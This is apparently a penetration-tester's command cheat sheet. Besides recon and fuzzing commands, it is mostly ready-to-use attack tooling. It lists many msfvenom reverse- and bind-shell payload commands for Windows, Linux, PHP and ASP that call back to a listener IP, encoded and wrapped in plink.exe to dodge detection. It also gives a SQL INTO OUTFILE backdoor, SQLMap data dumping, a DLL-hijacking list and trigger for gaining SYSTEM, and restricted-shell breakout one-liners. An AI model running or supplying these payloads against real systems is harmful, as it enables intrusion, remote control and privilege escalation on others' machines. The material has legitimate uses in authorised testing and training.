# Common

```powershell
===Nmap====
nmap -p- -sT -sV -A $IP
nmap -p- -sC -sV $IP --open
nmap -p- --script=vuln $IP
###HTTP-Methods
nmap --script http-methods --script-args http-methods.url-path='/website' 
###  --script smb-enum-shares
sed IPs:
grep -oE '((1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.){3}(1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])' FILE

================================================================================
===WPScan & SSL
wpscan --url $URL --disable-tls-checks --enumerate p --enumerate t --enumerate u

===WPScan Brute Forceing:
wpscan --url $URL --disable-tls-checks -U users -P /usr/share/wordlists/rockyou.txt

===Aggressive Plugin Detection:
wpscan --url $URL --enumerate p --plugins-detection aggressive
================================================================================
===Nikto with SSL and Evasion
nikto --host $IP -ssl -evasion 1
SEE EVASION MODALITIES.
================================================================================
===dns_recon
dnsrecon –d yourdomain.com
================================================================================
===gobuster directory
gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -k -t 30

===gobuster files
gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/raft-medium-files.txt -k -t 30

===gobuster for SubDomain brute forcing:
gobuster dns -d domain.org -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 30
"just make sure any DNS name you find resolves to an in-scope address before you test it"
================================================================================
===Extract IPs from a text file.
grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' nmapfile.txt
================================================================================
===Wfuzz XSS Fuzzing============================================================
wfuzz -c -z file,/opt/SecLists/Fuzzing/XSS/XSS-BruteLogic.txt "$URL"
wfuzz -c -z file,/opt/SecLists/Fuzzing/XSS/XSS-Jhaddix.txt "$URL"

===COMMAND INJECTION WITH POST DATA
wfuzz -c -z file,/opt/SecLists/Fuzzing/command-injection-commix.txt -d "doi=FUZZ" "$URL"

===Test for Paramter Existence!
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt "$URL"

===AUTHENTICATED FUZZING DIRECTORIES:
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 -d "SESSIONID=value" "$URL"

===AUTHENTICATED FILE FUZZING:
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-medium-files.txt --hc 404 -d "SESSIONID=value" "$URL"

===FUZZ Directories:
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-directories.txt --hc 404 "$URL"

===FUZZ FILES:
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-files.txt --hc 404 "$URL"
|
LARGE WORDS:
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-words.txt --hc 404 "$URL"
|
USERS:
wfuzz -c -z file,/opt/SecLists/Usernames/top-usernames-shortlist.txt --hc 404,403 "$URL"


================================================================================
===Command Injection with commix, ssl, waf, random agent.
commix --url="https://supermegaleetultradomain.com?parameter=" --level=3 --force-ssl --skip-waf --random-agent
================================================================================
===SQLMap
sqlmap -u $URL --threads=2 --time-sec=10 --level=2 --risk=2 --technique=T --force-ssl
sqlmap -u $URL --threads=2 --time-sec=10 --level=4 --risk=3 --dump
/SecLists/Fuzzing/alphanum-case.txt
================================================================================
===Social Recon
theharvester -d domain.org -l 500 -b google
================================================================================
===Nmap HTTP-methods
nmap -p80,443 --script=http-methods  --script-args http-methods.url-path='/directory/goes/here'
================================================================================
===SMTP USER ENUM
smtp-user-enum -M VRFY -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
smtp-user-enum -M EXPN -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
smtp-user-enum -M RCPT -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
smtp-user-enum -M EXPN -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
================================================================================

===Command Execution Verification - [Ping check]
tcpdump -i any -c5 icmp
====
#Check Network
netdiscover /r 0.0.0.0/24
====
#INTO OUTFILE D00R
SELECT “” into outfile “/var/www/WEROOT/backdoor.php”;
====
LFI?
#PHP Filter Checks.
php://filter/convert.base64-encode/resource=
====
UPLOAD IMAGE?
GIF89a1
```

# Directory FUZZ
```powershell
https://sirensecurity.io/blog/seclists/
cd /opt/
git clone https://github.com/danielmiessler/SecLists.git

[Nikto]
nikto --host $URL -C all

[GOBUSTER]
+ We will begin with Gobuster.
export URL="https://example.com/"

+ Here are my localized commands:
BUST DIRECTORIES:
gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -k -t 30

BUST FILES:
gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/raft-medium-files.txt -k -t 30

BUST SUB-DOMAINS:
gobuster dns -d someDomain.com -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 30
--> Make sure any DNS name you find resolves to an in-scope address before you test it.

===========================================================================

[WFUZZ]
export URL="https://example.com/FUZZ"

FUZZ DIRECTORIES:
export URL="https://example.com/FUZZ/"
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 "$URL"

FUZZ FILES:
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-medium-files.txt --hc 404 "$URL"

AUTHENTICATED FUZZING:
e.g.
wfuzz -c -b "<SESSIONVARIABLE>=<SESSIONVALUE>" -z file,/opt/SecLists/Discovery/Web-Content/raft-medium-files.txt --hc 404 "$URL"


FUZZ DATA AND CHECK FOR PARAMETERS:
export URL="https://example.com/?parameter=FUZZ
--> and/or some combination of...
export URL="https://example.com/?FUZZ=data
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt "$URL"

+ Can I FUZZ Post Data?
--> Yup.
--> Example of Command Injection POST Checks:
wfuzz -c -z file,/usr/share/wordlists/Fuzzing/command-injection.txt -d "postParameter=FUZZ" "$URL"
```

#  Venomref
```powershell
[+ WINDOWS ENCODED PAYLOADS ] PORT 443
====CHANGE. IP. AS. NEEDED.====

WINDOWS/SHELL/REVERSE_TCP [PORT 443]
msfvenom -p windows/shell/reverse_tcp LHOST=10.0.0.67 LPORT=443 --platform windows -a x86 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o reverse_encoded_86.exe

WINDOWS/SHELL_REVERSE_TCP (NETCAT x86) [PORT 443]
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.67 LPORT=443 --platform windows -a x86 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o reverse_encoded_86.exe

WINDOWS/SHELL_REVERSE_TCP (NETCAT x64) [PORT 443]
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.67 LPORT=443 --platform windows -a x64 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o reverse_encoded_86.exe

WINDOWS/METERPRETER/REVRESE_TCP (x86) [PORT 443] AT 10.0.0.67:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.67 LPORT=443 --platform windows -a x86 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o reverse_encoded_86.exe

WINDOWS/METERPRETER/REVRESE_TCP (x64) [PORT 443] AT 10.0.0.67:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.67 LPORT=443 --platform windows -a x64 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o reverse_encoded_64.exe


---===BIND SHELL, ENCODED, ON PORT 1234===---
msfvenom -p windows/shell_bind_tcp LHOST=10.0.0.67 LPORT=1234 --platform windows -a x86 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o bindshell_1234_encoded_86.exe

Code for encoding:
--platform windows -a x86 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o payload_86.exe

================================================================================
[+ LINUX ]
LINUX/x86/METERPRETER/REVERSE_TCP
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.67 LPORT=9997 -f elf >reverse.elf

NETCAT
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.67 LPORT=1234 -f elf >reverse.elf
================================================================================

[+ PHP ]
PHP/METERPRETER_REVERSE_TCP [PORT 443]
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.0.67 LPORT=443 -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

PHP/METERPRETER/REVERSE_TCP [PORT 443]
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.67 LPORT=443 -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

PHP/REVERSE_PHP [PORT 443]
msfvenom -p php/reverse_php LHOST=10.0.0.67 LPORT=443 -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
================================================================================

[+ ASP]
ASP-REVERSE-PAYLOAD [PORT 443]
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.67 LPORT=443 -f asp > shell.asp

OR FOR NETCAT [PORT 443]
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.67 LPORT=443 -f asp > shell.asp

================================================================================
[+ Client-Side, Unicode Payload - For use with Internet Explorer and IE]
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.30.5 LPORT=443 -f js_le -e generic/none

#Note: To keep things the same size, if needed add NOPs at the end of the payload.
#A Unicode NOP is - %u9090

================================================================================
===SHELLCODE GENERATION:
================================================================================
--===--
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.67 LPORT=80 EXITFUNC=thread -f python -a x86 --platform windows -b '\x00' -e x86/shikata_ga_nai
--===--
================================================================================
#DLL HiJacking - Windows - x64
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.45.190 LPORT=4444 -f dll -o Printconfig.dll
================================================================================
```


#dllred
```powershell
.bashrc
alias dllref='clear ; cat $HOME/ref/dllref'

This is potentially an incomplete list.

dllref (flat file):

=================================================================================
C:\Windows\System32\wpcoreutil.dll (Windows Insider service `wisvc` triggerd by Clicking Start Windows Insider Program)
=================================================================================
C:\Windows\System32\phoneinfo.dll (Windows Problem Reporting service)
https://twitter.com/404death/status/1262670619067334656  (without reboot by @jonasLyk)
=================================================================================
#dxgi - Trigger is check for protection update
C:\Windows\System32\wbem\dxgi.dll  (windows security -> check for protection update)
=================================================================================
#tzres.dll
C:\Windows\System32\wbem\tzres.dll (systeminfo, NetworkService) 
=================================================================================
### Need to reboot to get NT AUTHORITY\SYSTEM (hijack dll) ###
C:\Windows\System32\wlbsctrl.dll (IKEEXT service)
C:\Windows\System32\wbem\wbemcomn.dll (IP Helper)
=================================================================================
C:\Windows\System32\ualapi.dll (spooler service)
http://www.hexacorn.com/blog/2016/11/08/beyond-good-ol-run-key-part-50/
=================================================================================
C:\Windows\System32\fveapi.dll (ShellHWDetection Service)  @bohops
=================================================================================
C:\Windows\System32\Wow64Log.dll (this dll loaded by other third party services such as GoogleUpdate.exe)
http://waleedassar.blogspot.com/2013/01/wow64logdll.html
=================================================================================
#DLL
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.45.190 LPORT=4444 -f dll -o Printconfig.dll

#Overwrite:
C:\Windows\System32\spool\drivers\x64\3\

#Trigger
$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
$object = [Activator]::CreateInstance($type)
=================================================================================
#ALL ABOVE REQUIRE ADMIN READ/WRITE
https://github.com/CsEnox/SeManageVolumeExploit/
SeManageVolumeExploit.exe
=================================================================================
```

# Breakout Get that tty
```powershell
Out of the gate.


python -c 'import pty; pty.spawn("/bin/bash")'
OR
python3 -c 'import pty; pty.spawn("/bin/bash")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
alias ll='ls -lsaht --color=auto'
Keyboard Shortcut: Ctrl + Z (Background Process.)
stty raw -echo ; fg ; reset
stty columns 200 rows 200

 

* Grab a valid tty.
* What OS are you on? Grab access to those binaries fast by exporting each environment variable. Debian/CentOS/FreeBSD
* Want a color terminal to easily tell apart file permissions? Directories? Files?
* Fastest way to list out the files in a directory, show size, show permissions, human readable.
* Make this shell stable.




Is this rbash (Restricted Bash)? PT1
$ vi
:set shell=/bin/sh
:shell

$ vim
:set shell=/bin/sh
:shell

Is this rbash (Restricted Bash)? PT2
(This requires ssh user-level access)
ssh user@127.0.0.1 "/bin/sh"
rm $HOME/.bashrc
exit
ssh user@127.0.0.1
(Bash Shell)

Is python present on the target machine?
python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/sh")'

Is perl present on the target machine?
perl -e 'exec "/bin/bash";'
perl -e 'exec "/bin/sh";'

Is AWK present on the target machine?
awk 'BEGIN {system("/bin/bash -i")}'
awk 'BEGIN {system("/bin/sh -i")}'

Is ed present on the target machines?
ed
!sh

IRB Present on the target machine?
exec "/bin/sh"

Is Nmap present on the target machine?
nmap --interactive
nmap> !sh

Expect:

expect -v
  expect version 5.45.4
  
$ cat > /tmp/shell.sh <<EOF
#!/usr/bin/expect
spawn bash
interact
EOF

$ chmod u+x /tmp/shell.sh
$ /tmp/shell.sh
```

# RedTeam Resources
```powershell
+ Top Five Ways I got Domain Admin on your Internal Network Before Lunch.
https://adam-toscher.medium.com/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa


+ Impacket NTLMRelay.
https://github.com/SecureAuthCorp/impacket
https://www.secureauth.com/labs/open-source-tools/impacket/

+ NetExec.
https://github.com/Pennyw0rth/NetExec

+ Lateral Movement.
https://github.com/an4kein/awesome-red-teaming#-lateral-movement

+ Embedded and Peripheral Device Hacking
https://github.com/an4kein/awesome-red-teaming#-embedded-and-peripheral-devices-hacking

+ OSINT.
https://github.com/an4kein/awesome-red-teaming#-osint

+ Command and Control.
https://github.com/an4kein/awesome-red-teaming#-command-and-control

+ Phishing Attack Campaigns
https://github.com/an4kein/awesome-red-teaming#-social-engineering
```



# Special Thanks to the Creator of tools and Community
([S1REN](https://sirensecurity.io/blog/about-me/))
